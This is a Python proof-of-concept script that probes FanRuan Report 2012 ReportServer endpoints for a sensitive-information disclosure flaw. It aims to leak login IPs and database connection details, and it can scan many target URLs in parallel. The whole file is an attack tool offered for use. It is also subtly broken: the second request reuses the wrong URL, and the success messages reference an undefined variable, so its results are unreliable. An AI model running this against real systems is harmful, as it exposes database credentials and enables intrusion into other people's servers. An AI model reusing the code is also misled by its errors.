import time
import argparse
import requests
import multiprocessing
import urllib3
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())


def main(target_url):
    if target_url[:4]!='http':
        target_url = 'http://' + target_url
    if target_url[-1]!='/':
        target_url += '/' 
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0) Gecko/20100101 Firefox/50.0", 
        }
    exp_url = target_url+"ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false"
    vuln_url = target_url+"ReportServer?op=fr_server&cmd=sc_getconnectioninfo"
    console.print(now_time() + " [INFO]     正在检测帆软报表 2012 敏感信息泄露", style='bold blue')
    try:
        requests.packages.urllib3.disable_warnings()
        exp = requests.get(exp_url, headers=headers, verify=False)
        vuln = requests.get(exp_url, headers=headers, verify=False)
        if exp.status_code == 200 and "网络报表" in exp.text:
            console.print(now_time() + ' [SUCCESS]  获取登录报表系统的IP:{}'.format(shell_url), style='bold green')
        if vuln.status_code == 200 and "connection" in vuln.text:
            console.print(now_time() + ' [SUCCESS]  数据库信息泄露:{}'.format(shell_url), style='bold green')
        else:
            console.print(now_time() + ' [WARNING]  帆软报表 2012敏感信息泄露漏洞不存在', style='bold red ')
    except:
        console.print(now_time() + " [ERROR]    无法利用poc请求目标或被目标拒绝请求, ", style='bold red')
        
if __name__ == "__main__":
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url File', type=argparse.FileType('r'))
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.print('\nCTRL+C 退出', style='reverse bold red')
            
            